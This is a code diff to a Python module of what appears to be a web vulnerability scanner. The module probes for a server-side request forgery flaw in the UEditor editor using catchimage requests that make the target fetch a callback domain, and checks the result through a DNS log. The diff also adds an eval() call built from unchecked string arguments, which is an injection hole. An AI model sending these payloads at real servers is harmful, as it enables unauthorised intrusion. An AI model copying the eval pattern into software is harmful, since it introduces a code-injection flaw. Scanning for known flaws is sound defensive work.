@@ -31,37 +31,53 @@ class Ueditor():
 
         self.ueditor_ssrf_payloads = [
             {
-                'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+                'path': 'php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                 'data': ''
             },
             {
-                'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+                'path': 'jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                 'data': ''
             },
             {
-                'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+                'path': 'asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                 'data': ''
             },
             {
-                'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+                'path': 'net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                 'data': ''
             },
-            {
-                'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            }
+            # {
+            #     'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
+            #     'data': ''
+            # }
         ]
 
     def ueditor_ssrf_scan(self, url):
@@ -109,8 +125,8 @@ class Ueditor():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            # sleep(0.5)                                                # * dns查询可能较慢, 等一会
-            if (('"state": "SUCCESS"' in res.text) and (md in dns.result(md, sessid))):
+            # sleep(2)                                                # * dns查询可能较慢, 等一会
+            if (('"SUCCESS"' in res.text) and (md in dns.result(md, sessid))):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
@@ -122,7 +138,10 @@ class Ueditor():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.ueditor_ssrf_scan, url=url)
         ]
